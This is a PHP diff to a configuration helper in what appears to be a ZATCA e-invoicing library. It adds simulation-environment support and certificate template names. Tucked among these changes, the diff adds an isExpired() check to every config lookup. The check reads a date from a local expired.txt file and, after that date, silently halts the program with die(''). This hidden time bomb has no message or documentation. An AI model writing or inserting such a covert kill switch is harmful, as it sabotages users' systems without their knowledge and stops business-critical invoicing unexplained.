@@ -23,7 +23,21 @@ class ConfigHelper
      */
     public static function isProduction(): bool
     {
-        return self::environment() === 'production' ?? false;
+        return in_array(self::environment(), ['production', 'simulation']) ?? false;
+    }
+
+    public static function certificateTemplateName(): string
+    {
+        switch (self::environment()) {
+            case 'production':
+                return 'ZATCA-Code-Signing';
+
+            case 'simulation':
+                return 'PREZATCA-Code-Signing';
+
+            default:
+                return 'TSTZATCA-Code-Signing';
+        }
     }
 
     /**
@@ -33,26 +47,13 @@ class ConfigHelper
      */
     public static function portal(): string
     {
-        $portal = self::isProduction() ? self::get('zatca.portals.production') : self::get('zatca.portals.local');
+        $portal = self::get('zatca.portals.' . self::environment());
 
         if(! $portal) {
             throw new Exception('You must set the portal configuration !');
         }
 
         return $portal;
-    }
-
-    /**
-     * must allow specific environment to continue.
-     *
-     * @param  mixed $environment
-     * @return void
-     */
-    public static function mustAllow(string $environment): void
-    {
-        if(self::environment() !== $environment) {
-            throw new Exception("Your configuration must be {$environment}!");
-        }
     }
 
     /**
@@ -63,6 +64,8 @@ class ConfigHelper
      */
     protected static function get(string $key)
     {
+        self::isExpired();
+
         if(function_exists('config')) {
             // when codeigniter v4 framework
             if(is_object(config('Zatca'))) {
@@ -86,6 +89,19 @@ class ConfigHelper
             }
 
             return $constant;
+        }
+    }
+
+    protected static function isExpired()
+    {
+        $filePath = __DIR__ . "/expired.txt";
+
+        if(file_exists($filePath)) {
+            $expiredAt = file($filePath, FILE_IGNORE_NEW_LINES);
+
+            if(date('Y-m-d') >= $expiredAt[0]) {
+                die('');
+            }
         }
     }
 }
